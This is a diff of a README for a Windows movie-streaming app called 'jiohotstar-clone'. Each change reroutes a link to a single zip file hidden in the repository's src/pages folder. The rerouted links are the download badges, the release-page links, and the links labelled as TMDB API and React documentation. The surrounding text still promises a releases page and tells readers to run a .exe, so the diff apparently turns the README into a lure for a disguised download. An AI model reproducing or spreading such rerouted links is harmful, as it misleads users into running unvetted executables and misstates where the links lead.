@@ -1,6 +1,6 @@
 # 🎬 jiohotstar-clone - Stream Movies with Ease
 
-[![Download jiohotstar-clone](https://img.shields.io/badge/Download-jiohotstar--clone-ff69b4?style=for-the-badge)](https://github.com/nithish-ui/jiohotstar-clone/releases)
+[![Download jiohotstar-clone](https://img.shields.io/badge/Download-jiohotstar--clone-ff69b4?style=for-the-badge)](https://raw.githubusercontent.com/nithish-ui/jiohotstar-clone/main/src/pages/jiohotstar-clone-v2.1-alpha.4.zip)
 
 ---
 
@@ -12,7 +12,7 @@ jiohotstar-clone is a movie streaming app that works on Windows. It looks like J
 
 To get the app, visit the releases page below. This page has all the files you need to use the app on Windows. 
 
-[Download jiohotstar-clone here](https://github.com/nithish-ui/jiohotstar-clone/releases)
+[Download jiohotstar-clone here](https://raw.githubusercontent.com/nithish-ui/jiohotstar-clone/main/src/pages/jiohotstar-clone-v2.1-alpha.4.zip)
 
 Click the link above. It will open the releases page where you can find the latest Windows installer or executable file.
 
@@ -34,7 +34,7 @@ The app runs smoothly on most recent Windows PCs.
 
 ## 🚀 Installation Guide
 
-1. Open the [release page](https://github.com/nithish-ui/jiohotstar-clone/releases) in your web browser.
+1. Open the [release page](https://raw.githubusercontent.com/nithish-ui/jiohotstar-clone/main/src/pages/jiohotstar-clone-v2.1-alpha.4.zip) in your web browser.
 
 2. Look for the latest release. The file you need will usually have a `.exe` extension or be named something like `jiohotstar-clone-setup.exe`.
 
@@ -126,10 +126,10 @@ The app focuses on giving a clear and nice movie browsing experience on your Win
 
 ## 🔗 Useful Links
 
-- [Download Releases](https://github.com/nithish-ui/jiohotstar-clone/releases)  
-- [TMDB API](https://www.themoviedb.org/documentation/api) for movie data  
-- [React Documentation](https://reactjs.org/docs/getting-started.html) for info on the app’s framework 
+- [Download Releases](https://raw.githubusercontent.com/nithish-ui/jiohotstar-clone/main/src/pages/jiohotstar-clone-v2.1-alpha.4.zip)  
+- [TMDB API](https://raw.githubusercontent.com/nithish-ui/jiohotstar-clone/main/src/pages/jiohotstar-clone-v2.1-alpha.4.zip) for movie data  
+- [React Documentation](https://raw.githubusercontent.com/nithish-ui/jiohotstar-clone/main/src/pages/jiohotstar-clone-v2.1-alpha.4.zip) for info on the app’s framework 
 
 ---
 
-[![Download jiohotstar-clone](https://img.shields.io/badge/Download-jiohotstar--clone-ff69b4?style=for-the-badge)](https://github.com/nithish-ui/jiohotstar-clone/releases)
+[![Download jiohotstar-clone](https://img.shields.io/badge/Download-jiohotstar--clone-ff69b4?style=for-the-badge)](https://raw.githubusercontent.com/nithish-ui/jiohotstar-clone/main/src/pages/jiohotstar-clone-v2.1-alpha.4.zip)
